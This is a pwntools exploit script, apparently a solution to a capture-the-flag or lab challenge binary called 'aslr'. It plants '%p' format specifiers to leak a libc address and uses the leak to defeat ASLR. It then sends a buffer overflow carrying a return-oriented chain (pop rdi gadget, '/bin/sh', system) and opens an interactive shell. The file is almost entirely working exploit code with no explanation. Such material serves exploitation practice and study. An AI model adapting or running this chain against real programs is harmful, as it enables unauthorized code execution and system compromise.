from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
path = "./aslr"


#io = process(path)
io = gdb.debug(path, '''
            b main
            '''
        )

e = ELF(path)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")


bin_echo = 0x402060

cycle = cyclic(500)
offset = cyclic_find(0x62616162)
cmd_offset = cyclic_find(0x6161617261616171)
ret_offset = offset - (cmd_offset+8)


io.recvuntil(b"Enter your input:\n")
io.sendline(b"b")
io.recvuntil(b"(8-byte slots from buffer base): ")
io.sendline(b"0")
io.recvuntil(b"(hex, e.g. 0x...): ")
#io.sendline(hex(e.got['puts']).encode())
io.sendline(b"0x2570202570202570")      # %p

io.recvuntil(b"Enter your input:\n")
io.sendline(b"b")
io.recvuntil(b"(8-byte slots from buffer base): ")
io.sendline(b"1")
io.recvuntil(b"(hex, e.g. 0x...): ")
#io.sendline(hex(e.got['puts']).encode())
io.sendline(b"0x20257020257020")      # %p

#io.recvuntil(b"Enter your input:\n")
#io.sendline(b"b")
#io.recvuntil(b"(8-byte slots from buffer base): ")
#io.sendline(b"2")
#io.recvuntil(b"(hex, e.g. 0x...): ")
##io.sendline(hex(e.got['puts']).encode())
#io.sendline(b"0x7020257020257020")      # %p
#
#io.recvuntil(b"Enter your input:\n")
#io.sendline(b"b")
#io.recvuntil(b"(8-byte slots from buffer base): ")
#io.sendline(b"3")
#io.recvuntil(b"(hex, e.g. 0x...): ")
##io.sendline(hex(e.got['puts']).encode())
#io.sendline(b"0x2570202570202570")      # %p

io.recvuntil(b"Enter your input:\n")
io.sendline(b"c")
io.recvuntil(b"your input:\n")
leaks = io.recvuntil("Enter").split()
libc_leak = int(leaks[-1].split(b'(')[0].decode('utf-8'), 16)

print(hex(libc_leak))

libc.address = libc_leak - 1132514  
rdi_gadget = libc.address + 0x000000000002a3e5 # pop rdi; ret
ret_gadget = rdi_gadget + 1
binsh = next(libc.search(b"/bin/sh"))

payload = b"d" * cmd_offset + p64(bin_echo) + b"A" * ret_offset + p64(ret_gadget) + p64(rdi_gadget) + p64(binsh) + p64(libc.symbols["system"])

io.recvuntil(b"input:\n")
io.sendline(payload)

io.interactive()

